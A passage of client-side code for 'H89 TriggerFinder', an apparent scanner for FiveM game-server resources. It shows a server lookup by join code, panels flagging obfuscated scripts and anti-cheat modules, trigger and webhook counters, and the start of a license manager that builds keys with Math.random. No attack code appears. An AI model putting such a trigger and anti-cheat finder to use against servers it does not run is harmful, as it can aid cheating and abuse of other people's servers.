  const LS_FAVS = "cfx_favs_v1";
  const $ = (id)=>document.getElementById(id);

  function statusShow(type, html){
    const status = $("cfxStatus");
    if(!status) return;
    status.className = "cfx-status " + (type||"");
    status.innerHTML = html;
    status.style.display = "block";
  }
  function statusHide(){ const s=$("cfxStatus"); if(s) s.style.display="none"; }
  function resultShow(){ const r=$("cfxResult"); if(r) r.style.display="block"; }
  function resultHide(){ const r=$("cfxResult"); if(r) r.style.display="none"; }

  function setLoading(on){
    const sp = $("cfxSpinner");
    const t = $("cfxLookupText");
    const b = $("cfxLookupBtn");
    if(sp) sp.style.display = on ? "inline-block" : "none";
    if(t) t.textContent = on ? "Loading" : "Lookup";
    if(b) b.disabled = !!on;
  }

  function extractJoinCode(v){
    v = String(v||"").trim();
    if(!v) return "";
    const m1 = v.match(/cfx\.re\/join\/([a-zA-Z0-9]+)/i);
    if(m1) return m1[1];
    const m2 = v.match(/^([a-zA-Z0-9]{4,12})$/);
    if(m2) return m2[1];
    const parts = v.split("/").filter(Boolean);
    const last = parts[parts.length-1] || "";
    if(/^[a-zA-Z0-9]{4,12}$/.test(last)) return last;
    return "";
  }
  function safeText(x){ return (x===null||x===undefined||x==="") ? "‚Äî" : String(x); }

  function setTags(tags){
    const el = $("cfxTags");
    if(!el) return;
    el.innerHTML = "";
    (tags||[]).slice(0, 16).forEach(t=>{
      const s = document.createElement("span");
      s.className = "cfx-tag";
      s.textContent = t;
      el.appendChild(s);
    });
  }

  function setEndpoints(endpoints){
    const el = $("cfxEndpoints");
    if(!el) return;
    el.innerHTML = "";
    (endpoints||[]).slice(0, 8).forEach(ep=>{
      const s = document.createElement("span");
      s.className = "cfx-tag";
      s.textContent = ep;
      el.appendChild(s);
    });
  }

  function setIcon(code, hasIcon){
    const box = $("cfxServerIcon");
    if(!box) return;
    if(!code || !hasIcon){
      box.innerHTML = '<span style="opacity:.6;font-weight:900;">CFX</span>';
      return;
    }
    box.innerHTML = "";
    const img = document.createElement("img");
    img.src = API_ICON + code;
    img.alt = "Server icon";
    img.style.width = "100%";
    img.style.height = "100%";
    img.style.objectFit = "cover";
    img.onerror = ()=>{ box.innerHTML = '<span style="opacity:.6;font-weight:900;">CFX</span>'; };
    box.appendChild(img);
  }

  function setBanner(code){
    const wrap = $("cfxBanner");
    const img = $("cfxBannerImg");
    if(!wrap || !img){ return; }
    if(!code){
      wrap.style.display = "none";
      return;
    }
    wrap.style.display = "block";
    img.src = API_BANNER + code;
    img.onerror = ()=>{ wrap.style.display = "none"; };
  }

  function renderPlayers(players){
    const box = $("cfxPlayersBox");
    const sub = $("cfxPlayersSub");
    const list = $("cfxPlayersList");
    if(!box || !sub || !list) return;

    list.innerHTML = "";
    if(!Array.isArray(players) || players.length === 0){
      box.style.display = "none";
      return;
    }
    box.style.display = "block";
    sub.textContent = players.length + " players (API list)";
    // cap for UI performance
    const shown = players.slice(0, 60);
    for(const p of shown){
      const name = (p && (p.name || p.playerName || p.username)) ? String(p.name || p.playerName || p.username) : "player";
      const id = (p && (p.id || p.netId || p.identifiers?.license)) ? String(p.id || p.netId || p.identifiers?.license) : "";
      const row = document.createElement("div");
      row.className = "cfx-player";
      row.innerHTML = '<div class="n" title="'+escapeHtml(name)+'">'+escapeHtml(name)+'</div>' +
                      '<div class="id">'+escapeHtml(id)+'</div>';
      list.appendChild(row);
    }
    if(players.length > shown.length){
      const more = document.createElement("div");
      more.style.opacity = ".65";
      more.style.fontSize = "12px";
      more.style.marginTop = "8px";
      more.textContent = "+" + (players.length - shown.length) + " more‚Ä¶";
      list.appendChild(more);
    }
  }

  function escapeHtml(s){
    return String(s||"").replace(/[&<>"']/g, (c)=>({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c]));
  }

  // Favorites
  function loadFavs(){
    try{ return JSON.parse(localStorage.getItem(LS_FAVS) || "[]") || []; }catch(e){ return []; }
  }
  function saveFavs(arr){ localStorage.setItem(LS_FAVS, JSON.stringify(arr.slice(0, 50))); }
  function isFav(code){ return loadFavs().some(x => x.code === code); }
  function toggleFav(code, name){
    const arr = loadFavs().filter(x => x.code !== code);
    const was = (arr.length !== loadFavs().length);
    if(!was){
      arr.unshift({ code, name: name || "", at: Date.now() });
    }
    saveFavs(arr);
    renderFavState(code);
    renderHistory(); // show fav star in history label
    statusShow("ok", "<span class='b'>" + (was ? "Removed" : "Saved") + ".</span> " + (was ? "Removed from favorites." : "Added to favorites."));
    setTimeout(statusHide, 1200);
  }
  function renderFavState(code){
    const b = $("cfxFavBtn");
    if(!b) return;
    const fav = !!code && isFav(code);
    b.classList.toggle("is-fav", fav);
    b.textContent = fav ? "‚òÖ" : "‚òÜ";
    b.title = fav ? "Remove from favorites" : "Add to favorites";
  }

  // History (also shows favorites)
  function loadHistory(){
    try{ return JSON.parse(localStorage.getItem(LS_HISTORY) || "[]") || []; }catch(e){ return []; }
  }
  function saveHistory(arr){ localStorage.setItem(LS_HISTORY, JSON.stringify(arr.slice(0, 20))); }
  function pushHistory(code){
    const arr = loadHistory().filter(x => x !== code);
    arr.unshift(code);
    saveHistory(arr);
    renderHistory();
  }
  function renderHistory(){
    const sel = $("cfxHistory");
    if(!sel) return;
    const arr = loadHistory();
    const favs = loadFavs();
    sel.innerHTML = "";
    const opt0 = document.createElement("option");
    opt0.value = "";
    opt0.textContent = arr.length ? "Select previous code‚Ä¶" : "No history yet";
    sel.appendChild(opt0);
    for(const c of arr){
      const fav = favs.some(x=>x.code===c);
      const o = document.createElement("option");
      o.value = c;
      o.textContent = (fav ? "‚òÖ " : "") + c;
      sel.appendChild(o);
    }
  }

  async function copyText(txt, okMsg){
    try{ await navigator.clipboard.writeText(String(txt)); }catch(_){}
    statusShow("ok", "<span class='b'>Copied.</span> " + okMsg);
    setTimeout(statusHide, 1200);
  }

  function downloadJson(obj, filename){
    try{
      const blob = new Blob([JSON.stringify(obj, null, 2)], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      a.remove();
      setTimeout(()=>URL.revokeObjectURL(url), 500);
    }catch(e){}
  }

  let lastRaw = null;
  let lastCode = "";

  async function lookup(codeOverride){
    const input = $("cfxInput");
    const code = codeOverride || extractJoinCode(input?.value);
    if(!code){
      statusShow("err", "<span class='b'>Invalid input.</span> Paste <b>g6qlkx</b> or <b>cfx.re/join/xxxxxx</b>.");
      return;
    }
    lastCode = code;
    localStorage.setItem(LS_LAST, code);
    pushHistory(code);

    statusShow("", "<span class='b'>Looking up‚Ä¶</span> " + code);
    resultHide();
    setLoading(true);

    try{
      const res = await fetch(API_BASE + encodeURIComponent(code), { cache: "no-store" });
      if(!res.ok){
        statusShow("err", "<span class='b'>Lookup failed.</span> HTTP " + res.status);
        return;
      }
      const json = await res.json();
      const data = json && (json.Data || json.data || json);
      if(!data){
        statusShow("err", "<span class='b'>No data.</span>");
        return;
      }
      lastRaw = data;

      const hostname = data.hostname || data.name || "Unknown Server";
      const clients = data.clients ?? 0;
      const max = data.sv_maxclients ?? data.vars?.sv_maxclients ?? 0;
      const locale = data.vars?.locale || data.vars?.sv_locale || data.locale || "‚Äî";
      const connect = (data.connectEndPoints && data.connectEndPoints[0]) || data.EndPoint || "‚Äî";
      const endpoints = data.connectEndPoints || (connect && connect !== "‚Äî" ? [connect] : []);

      const owner = data.ownerName || data.owner || data.vars?.owner || "‚Äî";
      const game = data.gameName || data.gamename || data.vars?.gamename || "gta5";
      const map = data.mapname || data.vars?.mapname || "‚Äî";
      const onesync = data.vars?.onesync_enabled ?? data.vars?.onesync ?? "‚Äî";

      // icon/banner (best-effort)
      setIcon(code, !!data.iconVersion);
      setBanner(code);

      $("cfxServerName").textContent = hostname;
      $("cfxBadgePlayers").textContent = safeText(clients) + "/" + safeText(max);
      $("cfxBadgeLocale").textContent = safeText(locale);

      const joinUrl = "https://cfx.re/join/" + code;
      const joinLink = $("cfxJoinLink");
      joinLink.textContent = "cfx.re/join/" + code;
      joinLink.href = joinUrl;

      $("cfxConnect").textContent = safeText(connect);
      $("cfxOwner").textContent = safeText(owner);
      $("cfxGame").textContent = safeText(game);
      $("cfxMap").textContent = safeText(map);
      $("cfxOneSync").textContent = safeText(onesync);

      const tags = data.vars?.tags ? String(data.vars.tags).split(",").map(s=>s.trim()).filter(Boolean) : [];
      setTags(tags);
      setEndpoints(endpoints);

      // players list (if API provides)
      renderPlayers(data.players || data.Players || data.playerList || []);

      const __cfxCopyJoin = $("cfxCopyJoin");
      if(__cfxCopyJoin) __cfxCopyJoin.onclick = ()=>copyText(joinUrl, "Join link copied.");
      const __cfxCopyConnect = $("cfxCopyConnect");
      if(__cfxCopyConnect) __cfxCopyConnect.onclick = ()=>copyText(connect, "Connect endpoint copied.");
      const __cfxOpenConnect = $("cfxOpenConnect");
      if(__cfxOpenConnect) __cfxOpenConnect.onclick = ()=>{
      try{
          const url = String(connect).startsWith("http") ? String(connect) : ("http://" + String(connect));
          window.open(url, "_blank", "noreferrer");
        }catch(_){}
      };

      // Favorites + export binding
      renderFavState(code);
      const __cfxFavBtn = $("cfxFavBtn");
      if(__cfxFavBtn) __cfxFavBtn.onclick = ()=>toggleFav(code, hostname);
      const __cfxExportJson = $("cfxExportJson");
      if(__cfxExportJson) __cfxExportJson.onclick = ()=>{
      if(!lastRaw){
          statusShow("err","<span class='b'>Nothing to export.</span>");
          return;
        }
        downloadJson(lastRaw, "cfx_" + code + ".json");
        statusShow("ok","<span class='b'>Exported.</span> Download started.");
        setTimeout(statusHide, 1200);
      };

      statusShow("ok", "<span class='b'>Success.</span> Server info loaded.");
      resultShow();
    }catch(e){
      console.error(e);
      statusShow("err", "<span class='b'>Lookup error.</span> " + (e?.message || "Unknown error"));
    }finally{
      setLoading(false);
    }
  }

  function openPanel(){
    const panel = $("cfxFinderPanel");
    if(!panel) return;
    panel.style.display = "block";
    statusHide();
    const last = localStorage.getItem(LS_LAST) || "";
    const input = $("cfxInput");
    if(input && last && !input.value) input.value = last;
    renderHistory();
    renderFavState(last);
    setTimeout(()=>input?.focus(), 30);
  }
  function closePanel(){
    const panel = $("cfxFinderPanel");
    if(!panel) return;
    panel.style.display = "none";
  }

  document.addEventListener("DOMContentLoaded", ()=>{
    document.getElementById("cfxFinderBtn")?.addEventListener("click", openPanel);
    document.getElementById("h89-open-cfx")?.addEventListener("click", openPanel);

    $("cfxLookupBtn")?.addEventListener("click", ()=>lookup());
    $("cfxRefreshBtn")?.addEventListener("click", ()=>{
      const code = extractJoinCode($("cfxInput")?.value);
      if(code) lookup(code);
      else statusShow("err","<span class='b'>Nothing to refresh.</span>");
    });
    $("cfxInput")?.addEventListener("keydown", (e)=>{ if(e.key==="Enter") lookup(); });

    $("cfxHistory")?.addEventListener("change", (e)=>{
      const code = e.target.value;
      if(!code) return;
      $("cfxInput").value = code;
      lookup(code);
    });
    $("cfxClearHistory")?.addEventListener("click", ()=>{
      localStorage.removeItem(LS_HISTORY);
      renderHistory();
      statusShow("ok","<span class='b'>Cleared.</span> History cleared.");
      setTimeout(statusHide, 900);
    });

    $("cfxCloseBtn")?.addEventListener("click", closePanel);
    $("cfxFinderPanel")?.querySelector(".cfx-backdrop")?.addEventListener("click", closePanel);
  });
})();
</script>
 <script src="./ui-kit.js"></script>

<script>
/* ===== H89 TriggerFinder UI Enhancements ===== */
(function(){
  // Mirror internal logs to notification center
  try{
    if(window.addLog && !window.addLog.__h89Wrapped){
      const orig = window.addLog;
      window.addLog = function(entry){
        try{
          if(window.h89Notify){
            const t = (entry && entry.type) ? String(entry.type) : "info";
            const msg = (entry && entry.msg) ? String(entry.msg) : "";
            if(t === "warn") window.h89Notify("warn", msg);
            else if(t === "bad" || t === "err" || t === "error") window.h89Notify("err", msg);
            else if(t === "ok") window.h89Notify("ok", msg);
            else window.h89Notify("info", msg);
          }
        }catch(_){}
        return orig.apply(this, arguments);
      };
      window.addLog.__h89Wrapped = true;
    }
  }catch(_){}

  // Result card copy button (best-effort)
  const rc = document.getElementById("results-container");
  if(!rc) return;

  function decorate(){
    const items = rc.querySelectorAll(".trigger, .resultItem, .h89-result");
    items.forEach(el=>{
      if(el.querySelector(".h89-copybtn")) return;
      const nameEl = el.querySelector(".name, .triggerName, .tName") || el;
      const txt = (nameEl && nameEl.textContent) ? nameEl.textContent.trim() : "";
      if(!txt) return;

      const btn = document.createElement("button");
      btn.className = "h89-copybtn";
      btn.type = "button";
      btn.innerHTML = '<i class="fa-regular fa-copy"></i>';
      btn.title = "Copy trigger";
      btn.addEventListener("click",(e)=>{
        e.stopPropagation();
        navigator.clipboard.writeText(txt).then(()=>{
          try{ window.h89Notify && window.h89Notify("ok", "Copied: "+txt); }catch(_){}
        }).catch(()=>{});
      });
      el.style.position = "relative";
      el.appendChild(btn);
    });
  }

  const obs = new MutationObserver(()=> decorate());
  obs.observe(rc, {childList:true, subtree:true});
  decorate();
})();
</script>
<style>
/* Copy button style */
.h89-copybtn{
  position:absolute;
  top:10px; right:10px;
  width:36px; height:36px;
  border-radius:12px;
  border:1px solid rgba(255,255,255,.12);
  background: rgba(255,255,255,.06);
  color:#fff;
  cursor:pointer;
}
.h89-copybtn:hover{
  border-color: rgba(255,45,45,.55);
  background: rgba(255,45,45,.12);
}

/* ===== Protection panel expand + toolbar count ===== */
.h89-countpill{
  margin-left:8px;
  padding:2px 8px;
  border-radius:999px;
  border:1px solid rgba(255,255,255,.12);
  background: rgba(255,255,255,.06);
  font-size:11px;
  font-weight:900;
}
.h89-protect-item{cursor:pointer;}
.h89-protect-item-head{display:flex; align-items:center; justify-content:space-between; gap:10px}
.h89-protect-actions{display:flex; align-items:center; gap:8px}
.h89-protect-expand{
  margin-top:10px;
  border-top:1px dashed rgba(255,255,255,.10);
  padding-top:10px;
  display:flex;
  flex-direction:column;
  gap:6px;
}
.h89-protect-expand .h89-path{
  font-size:11px;
  opacity:.9;
  word-break: break-all;
  padding:6px 8px;
  border-radius:12px;
  border:1px solid rgba(255,255,255,.10);
  background: rgba(0,0,0,.18);
}
.h89-protect-expand .h89-path small{opacity:.7}
.h89-protect-expand.hide{display:none !important;}
.h89-protect-mini{
  padding:6px 10px;
  border-radius:12px;
  background: rgba(255,255,255,.06);
  border:1px solid rgba(255,255,255,.12);
  color:#fff;
  cursor:pointer;
  font-family: var(--font-family);
  font-weight:900;
  font-size:11px;
}
.h89-protect-mini:hover{border-color: rgba(255,45,45,.55); background: rgba(255,45,45,.12);}

.h89-sev{
  padding:3px 10px;
  border-radius:999px;
  font-size:11px;
  font-weight:900;
  border:1px solid rgba(255,255,255,.12);
  background: rgba(255,255,255,.06);
  color:#fff;
}
.h89-sev-high{
  border-color: rgba(255,0,0,.45);
  background: rgba(255,0,0,.12);
}
.h89-sev-clean{
  border-color: rgba(34,197,94,.35);
  background: rgba(34,197,94,.10);
}

</style>

<!-- ===== H89 Protection Checks Slide Panel ===== -->
<div id="h89-protect-backdrop" class="h89-panel-backdrop" style="display:none"></div>
<aside id="h89-protect-panel" class="h89-slidepanel" style="display:none" aria-label="Protection Checks">
  <div class="h89-slidehead">
    <div>
      <div class="h89-slidetitle">üõ° Protection Checks</div>
      <div class="h89-slidesub" id="h89-protect-sub">No issues detected.</div>
    </div>
    <button id="h89-protect-close" class="h89-tbtn" type="button">‚úï</button>
  </div>

  <div class="h89-slidebody">
    <div class="h89-protect-card">
      <div class="h89-protect-row">
        <b>Protected Banner</b>
        <span class="h89-badgecount" id="pcBannerCount">0</span>
      </div>
      <div class="h89-protect-list" id="pcBannerList"></div>
    </div>

    <div class="h89-protect-card">
      <div class="h89-protect-row">
        <b>Obfuscated Scripts</b>
        <span class="h89-badgecount" id="pcObfCount">0</span>
      </div>
      <div class="h89-protect-list" id="pcObfList"></div>
    </div>

    <div class="h89-protect-card">
      <div class="h89-protect-row">
        <b>Suspicious Manifest</b>
        <span class="h89-badgecount" id="pcManCount">0</span>
      </div>
      <div class="h89-protect-list" id="pcManList"></div>
    </div>
  </div>

  <div class="h89-slidefoot">
    <button id="pcCopyAll" class="h89-tbtn h89-primary" type="button">COPY ALL</button>
  </div>
</aside>

<script>
/* ===== H89 Protection Checks Panel (Safe, Vendor-Agnostic UI) ===== */
(function(){
  const checks = {
    banner: new Map(),     // resource -> [evidence]
    obfuscated: new Map(), // resource -> [files]
    manifest: new Map()    // resource -> [evidence]
  };

  function add(bucket, resource, value){
    try{
      const m = checks[bucket];
      if (!m.has(resource)) m.set(resource, []);
      m.get(resource).push(value);
      render();
      updateToolbarBadge();
    }catch(_){}
  }

    function renderList(el, map){
    el.innerHTML = "";
    for (const [res, arr] of map.entries()){
      const item = document.createElement("div");
      item.className = "h89-protect-item";

      const head = document.createElement("div");
      head.className = "h89-protect-item-head";

      const title = document.createElement("b");
      title.innerHTML = escapeHtml(res);

      const actions = document.createElement("div");
      actions.className = "h89-protect-actions";

      const meta = document.createElement("small");
      meta.textContent = `${(arr||[]).length} item(s)`;

      // Severity badge (HIGH) if any evidence is marked HIGH
      const hasHigh = (arr||[]).some(v => {
        if (v && typeof v === "object") return String(v.severity||"").toUpperCase() === "HIGH";
        return String(v||"").toUpperCase().includes("[HIGH]");
      });
      const sev = document.createElement("span");
      sev.className = "h89-sev " + (hasHigh ? "h89-sev-high" : "h89-sev-clean");
      sev.textContent = hasHigh ? "HIGH" : "CLEAN";

      const viewBtn = document.createElement("button");
      viewBtn.className = "h89-protect-mini";
      viewBtn.type = "button";
      viewBtn.textContent = "VIEW";
      viewBtn.onclick = (ev) => {
        ev.stopPropagation();
        if (typeof window.openDetectModal === "function") window.openDetectModal(res);
        else {
          // fallback: copy raw evidence
          const lines = (arr||[]).map(v => (v && typeof v === "object")
            ? `${v.severity||""} ${v.filePath||""} ${v.reason?("- "+v.reason):""}`.trim()
            : String(v)
          );
          if (navigator.clipboard) navigator.clipboard.writeText(lines.join("\n"));
        }
      };

      actions.appendChild(meta);
      actions.appendChild(sev);
      actions.appendChild(viewBtn);

      head.appendChild(title);
      head.appendChild(actions);

      const exp = document.createElement("div");
      exp.className = "h89-protect-expand hide";
      // render paths/evidence
      (arr || []).slice(0, 200).forEach((v) => {
        const p = document.createElement("div");
        p.className = "h89-path";
        if (v && typeof v === "object"){
          const sevTxt = String(v.severity||"").toUpperCase();
          const reason = v.reason ? ` ‚Ä¢ ${v.reason}` : "";
          p.textContent = `${sevTxt ? ("["+sevTxt+"] ") : ""}${v.filePath||""}${reason}`;
        } else {
          p.textContent = String(v);
        }
        exp.appendChild(p);
      });

      item.appendChild(head);
      item.appendChild(exp);

      item.onclick = () => {
        exp.classList.toggle("hide");
      };

      el.appendChild(item);
    }
  }


  function escapeHtml(s){
    return String(s||"").replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  }

  function render(){
    const b = document.getElementById("pcBannerCount");
    const o = document.getElementById("pcObfCount");
    const m = document.getElementById("pcManCount");
    const sub = document.getElementById("h89-protect-sub");
    const bl = document.getElementById("pcBannerList");
    const ol = document.getElementById("pcObfList");
    const ml = document.getElementById("pcManList");
    if (!b||!o||!m||!sub||!bl||!ol||!ml) return;

    const bc = checks.banner.size;
    const oc = checks.obfuscated.size;
    const mc = checks.manifest.size;
    b.textContent = bc;
    o.textContent = oc;
    m.textContent = mc;
    const total = bc+oc+mc;
    sub.textContent = total ? `${total} issue(s) detected.` : "No issues detected.";

    renderList(bl, checks.banner);
    renderList(ol, checks.obfuscated);
    renderList(ml, checks.manifest);
  }

  function open(){
    const bd = document.getElementById("h89-protect-backdrop");
    const pn = document.getElementById("h89-protect-panel");
    if (bd) bd.style.display = "block";
    if (pn) pn.style.display = "flex";
    render();
  }
  function close(){
    const bd = document.getElementById("h89-protect-backdrop");
    const pn = document.getElementById("h89-protect-panel");
    if (bd) bd.style.display = "none";
    if (pn) pn.style.display = "none";
  }

    function updateToolbarBadge(){
    const btn = document.getElementById("h89ProtectBtn");
    const pill = document.getElementById("h89ProtectCount");
    if (!btn) return;
    const total = checks.banner.size + checks.obfuscated.size + checks.manifest.size;

    btn.title = total ? `Protection checks (${total})` : "Protection checks";

    if (pill){
      pill.textContent = `(${total})`;
      pill.style.display = total ? "inline-flex" : "none";
    }
  }


  function copyAll(){
    const out = {
      banner: Object.fromEntries(checks.banner),
      obfuscated: Object.fromEntries(checks.obfuscated),
      manifest: Object.fromEntries(checks.manifest)
    };
    const txt = JSON.stringify(out, null, 2);
    navigator.clipboard?.writeText(txt);
    if (typeof window.showToast === "function") window.showToast("ok", "Copied", "Protection checks copied.");
  }

  // Expose hook API for existing detections (safe labels)
  window.__h89ProtectionChecks = { add, open };

  function init(){
    document.getElementById("h89ProtectBtn")?.addEventListener("click", open);
    document.getElementById("h89-protect-backdrop")?.addEventListener("click", close);
    document.getElementById("h89-protect-close")?.addEventListener("click", close);
    document.getElementById("pcCopyAll")?.addEventListener("click", copyAll);
    updateToolbarBadge();
  }

  if (document.readyState === "loading") {
    window.addEventListener("DOMContentLoaded", init);
  } else {
    // In case this script loads after DOMContentLoaded
    init();
  }
})();
</script>


<script>
/* === Protection panel safe init (fix) === */
(function initProtectionSafe(){
  try{
    const btn = document.getElementById("btnProtect");
    const panel = document.getElementById("h89-protect-panel");
    const back = document.getElementById("h89-protect-backdrop");
    const closeBtn = document.getElementById("h89-protect-close");
    if(btn && panel && back){
      btn.addEventListener("click", ()=>{ panel.style.display="flex"; back.style.display="block"; });
    }
    if(back) back.addEventListener("click", ()=>{ if(panel) panel.style.display="none"; back.style.display="none"; });
    if(closeBtn) closeBtn && closeBtn.addEventListener("click", ()=>{ if(panel) panel.style.display="none"; if(back) back.style.display="none"; });
  }catch(e){ console.error("Protection init failed", e); }
})();
</script>


<script>
/* v5.2 stats sync (speed + pulse) */
(function(){
  function pulseCard(statKey){
    const card = document.querySelector('#stats-container .stat-card[data-stat="'+statKey+'"]');
    if (!card) return;
    card.classList.remove('pulse');
    void card.offsetWidth;
    card.classList.add('pulse');
  }

  // Mirror scan speed to top chip
  const speedEl = document.getElementById('scan-speed');
  const chipEl  = document.getElementById('statSpeedChip');
  const subEl   = document.getElementById('statFilesSub');

  if (speedEl && chipEl){
    const obs = new MutationObserver(()=> {
      const v = (speedEl.textContent || '0').trim();
      chipEl.textContent = v + ' files/s';
      pulseCard('files');
    });
    obs.observe(speedEl, { childList:true, characterData:true, subtree:true });
  }

  // Mirror scanning state text if present
  const scanTitle = document.querySelector('.scan-title');
  if (scanTitle && subEl){
    const obs2 = new MutationObserver(()=> {
      const t = (scanTitle.textContent || '').trim();
      subEl.textContent = t || 'Ready';
    });
    obs2.observe(scanTitle, { childList:true, characterData:true, subtree:true });
  }

  // Pulse stats when their numbers change
  ['triggers','webhooks','fiveguard','shops','coords'].forEach((k)=>{
    const idMap = {
      triggers: 'triggers-count',
      webhooks: 'webhooks-count',
      fiveguard: 'fiveguard-count',
      shops: 'shops-count',
      coords: 'coords-count'
    };
    const el = document.getElementById(idMap[k]);
    if (!el) return;
    const o = new MutationObserver(()=> pulseCard(k));
    o.observe(el, { childList:true, characterData:true, subtree:true });
  });
})();
</script>


<script>
(function(){
  const THEME_KEY = "h89_toolbar_theme";
  function applyTheme(t){
    const theme = (t || "red").toLowerCase();
    document.documentElement.setAttribute("data-theme", theme);
    // update dot color via CSS var already
  }
  document.addEventListener("DOMContentLoaded", () => {
    const sel = document.getElementById("toolbarTheme");
    const saved = localStorage.getItem(THEME_KEY) || "red";
    applyTheme(saved);
    if (sel){
      sel.value = saved;
      sel.addEventListener("change", () => {
        const v = sel.value || "red";
        localStorage.setItem(THEME_KEY, v);
        applyTheme(v);
      });
    }
  });
})();
</script>


<script>
document.addEventListener("DOMContentLoaded", ()=>{
  try{
    h89WireFiltersUI();
    h89RefreshFilterTypeOptions();
  }catch(e){}
});
</script>
<script>

// ===== High-Risk Panel (v5.7) =====
window.__h89HighRisk = window.__h89HighRisk || new Map();

function h89BuildRiskTags(codes){
  const wrap = document.createElement('div');
  wrap.className = 'h89-risk-tags';
  const list = Array.isArray(codes) ? codes : [];
  const defs = {
    OBF: {cls:'obf', title:'Obfuscated code'},
    AC:  {cls:'ac',  title:'Anti-cheat / Protection'},
    AI:  {cls:'ai',  title:'AI protection module'},
    FG:  {cls:'fg',  title:'FiveGuard related'}
  };
  list.forEach(c => {
    const key = String(c||'').toUpperCase();
    if(!defs[key]) return;
    const el = document.createElement('span');
    el.className = `h89-risk-rtag ${defs[key].cls}`;
    el.textContent = key;
    el.title = defs[key].title;
    wrap.appendChild(el);
  });
  return wrap;
}

function h89ResourceFromPath(p){
  try{
    const parts = String(p||"").split(/[\\/]/).filter(Boolean);
    if(parts.length >= 2) return parts[parts.length-2];
    return parts[0] || "Unknown";
  }catch{ return "Unknown"; }
}

function detectCyberSharedScript(text){
  try{
    return /shared_script\s+["']@CyberAnticheat\/init\.lua["']/i.test(String(text||""));
  }catch{ return false; }
}

function h89AddHighRisk(resourceName, reason, filePath, codes){
  const key = String(resourceName || "Unknown");
  const prev = window.__h89HighRisk.get(key);
  const entry = {
    resource: key,
    reason: String(reason || "High-risk"),
    filePath: String(filePath || ""),
    codes: Array.isArray(codes) ? codes : (prev?.codes || [])
  };
  window.__h89HighRisk.set(key, prev ? {...prev, ...entry} : entry);
  h89RenderHighRisk();
  try{
    const pill = document.getElementById("h89ProtectCount");
    if(pill){
      pill.style.display = "inline-block";
      pill.textContent = `(${window.__h89HighRisk.size})`;
    }
  }catch(_){}
}

function h89RenderHighRisk(){
  const list = document.getElementById("h89-highrisk-list");
  const empty = document.getElementById("h89-highrisk-empty");
  if(!list || !empty) return;

  list.innerHTML = "";
  if(window.__h89HighRisk.size === 0){
    empty.style.display = "block";
    return;
  }
  empty.style.display = "none";

  for(const [k, v] of window.__h89HighRisk.entries()){
    const row = document.createElement("div");
    row.className = "h89-risk-row";
    const safeName = String(v.resource||k).replace(/[<>&"]/g, "");
    const safeReason = String(v.reason||"High-risk").replace(/[<>&"]/g, "");
    row.innerHTML = `
      <div class="h89-risk-left">
        <div class="h89-risk-name">${safeName}</div>
        <div class="h89-risk-reason">${safeReason}</div>
      </div>
      <div class="h89-risk-actions">
        <span class="h89-risk-tag">HIGH-RISK</span>
        <button class="h89-tbtn" type="button" data-hr-copy="${safeName.replace(/"/g,'&quot;')}">Copy</button>
      </div>
    `;
    // Insert reason icon tags (OBF/AC/AI/FG)
    try{
      const actions = row.querySelector('.h89-risk-actions');
      const tags = h89BuildRiskTags(v.codes || []);
      const anchor = actions?.querySelector('.h89-risk-tag');
      if(actions && tags && tags.childNodes.length && anchor){
        actions.insertBefore(tags, anchor.nextSibling);
      }
    }catch(_){ }
    row.querySelector('[data-hr-copy]')?.addEventListener("click", () => {
      try{ navigator.clipboard.writeText(v.resource || k); }catch(e){}
    });
    list.appendChild(row);
  }
}

function h89ShowHighRisk(){
  const panel = document.getElementById("h89-highrisk-panel");
  const results = document.getElementById("results-container");
  if(panel) panel.style.display = "block";
  if(results) results.style.display = "none";
  h89RenderHighRisk();
}

function h89HideHighRisk(){
  const panel = document.getElementById("h89-highrisk-panel");
  const results = document.getElementById("results-container");
  if(panel) panel.style.display = "none";
  if(results) results.style.display = "block";
}

document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("h89-open-highrisk")?.addEventListener("click", h89ShowHighRisk);
  document.getElementById("h89-highrisk-close")?.addEventListener("click", h89HideHighRisk);

  document.addEventListener("keydown", (e) => {
    if(e.ctrlKey && e.shiftKey && (e.key === "H" || e.key === "h")){
      e.preventDefault();
      const panel = document.getElementById("h89-highrisk-panel");
      if(panel && panel.style.display === "block") h89HideHighRisk(); else h89ShowHighRisk();
    }
  });
});

</script>

<script>
/* Desktop (Electron) helper: if running in Electron, you can open native folder picker */
window.openNativeFolderPicker = async function () {
  try {
    if (window.desktop && typeof window.desktop.pickFolder === 'function') {
      const folder = await window.desktop.pickFolder();
      if (!folder) return;
      // You can show selected folder somewhere (optional)
      console.log('Selected folder:', folder);
      // NOTE: Browser File API can't read folder path contents directly.
      // For a full native scan, we would add IPC APIs to read files from disk.
    }
  } catch (e) {
    console.warn('Native folder picker failed:', e);
  }
};
</script>
</body></html>
<script>
document.addEventListener('DOMContentLoaded',()=>{
 const b=document.getElementById('webhooksBtn');
 const p=document.getElementById('webhooksPanel');
 if(b&&p){b.addEventListener('click',()=>{p.classList.toggle('open');});}
});

// ===== Admin License Manager =====
function _toIso(d){
  if(!d) return "-";
  try{
    const dt = d.toDate ? d.toDate() : (d instanceof Date ? d : new Date(d));
    if(Number.isNaN(dt.getTime())) return "-";
    return dt.toISOString().slice(0,10);
  }catch(e){ return "-"; }
}

function _escape(s){ return String(s||"").replace(/[&<>"']/g, c=>({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c])); }

function _randKey(len=24){
  const chars="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let out="";
  for(let i=0;i<len;i++) out += chars[Math.floor(Math.random()*chars.length)];
  return out;
}

async function adminLoadLicense(key){
  const ref = doc(db,"licenses", key);
  const snap = await getDoc(ref);
  if(!snap.exists()) return null;
  return { key, ...(snap.data()||{}) };
}

function adminRenderLicenseInfo(rec){
  const box = document.getElementById("licInfo");
  const txt = document.getElementById("licInfoText");
  if(!rec){ box.style.display="none"; return; }
  box.style.display="block";
  const exp = rec.expiresAt ? _toIso(rec.expiresAt) : "-";
  const status = rec.revokedAt ? "REVOKED" : ((rec.active===false) ? "DISABLED" : (rec.used ? "USED" : "READY"));
  txt.innerHTML = `
    <div><b>Key:</b> <span style="font-family:ui-monospace">${_escape(rec.key)}</span></div>
